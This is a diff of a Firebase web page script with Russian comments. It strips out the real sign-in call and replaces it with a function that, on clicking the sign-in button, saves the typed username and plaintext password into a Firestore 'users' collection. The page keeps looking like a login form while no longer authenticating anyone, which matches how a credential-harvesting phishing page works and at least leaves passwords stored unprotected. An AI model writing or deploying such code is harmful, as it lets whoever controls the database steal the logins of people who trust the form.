@@ -1,6 +1,5 @@
 // Инициализация Firebase
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
 
 // Конфигурация Firebase
@@ -16,26 +15,21 @@ const firebaseConfig = {
 
 // Инициализация Firebase
 const app = initializeApp(firebaseConfig);
-const auth = getAuth(app);
 const db = getFirestore(app);
 
-// Функция для входа и отправки данных в Firestore
-async function signInAndSaveData(username, password) {
+// Функция для добавления данных в Firestore
+async function saveDataToFirestore(username, password) {
   try {
-    // Аутентификация пользователя
-    const userCredential = await signInWithEmailAndPassword(auth, username, password);
-    console.log('User signed in:', userCredential.user);
-
     // Добавление данных в Firestore
     await addDoc(collection(db, "users"), {
       username: username,
-      email: userCredential.user.email,
-      loginTimestamp: new Date(),
+      password: password,
+      timestamp: new Date(),
     });
 
     console.log("Данные пользователя добавлены в Firestore");
   } catch (error) {
-    console.error("Ошибка при аутентификации или добавлении данных в Firestore:", error.message);
+    console.error("Ошибка при добавлении данных в Firestore:", error.message);
   }
 }
 
@@ -46,7 +40,7 @@ document.getElementById("signInBtn").addEventListener("click", function() {
 
   // Проверка на пустые поля
   if (username && password) {
-    signInAndSaveData(username, password);
+    saveDataToFirestore(username, password);
   } else {
     alert("Пожалуйста, заполните все поля");
   }
